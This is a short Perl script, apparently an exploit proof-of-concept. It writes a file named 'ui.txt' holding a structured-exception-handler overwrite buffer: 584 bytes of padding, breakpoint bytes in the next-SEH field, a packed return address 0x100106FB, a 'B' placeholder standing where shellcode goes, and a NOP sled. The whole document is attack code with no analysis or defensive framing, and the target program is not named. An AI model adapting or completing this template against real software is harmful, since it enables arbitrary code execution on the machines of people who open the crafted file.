$uitxt = "ui.txt";

my $junk = "A" x 584 ;
my $nSEH = "\xcc\xcc\xcc\xcc" ;
my $SEH = pack('V',0x100106FB);
my $shell = "B" x 500;
my $junk2 = "\x90" x 1000 ;

open(myfile,">$uitxt") ;
print myfile $junk.$nSEH.$SEH.$shell.$junk2;
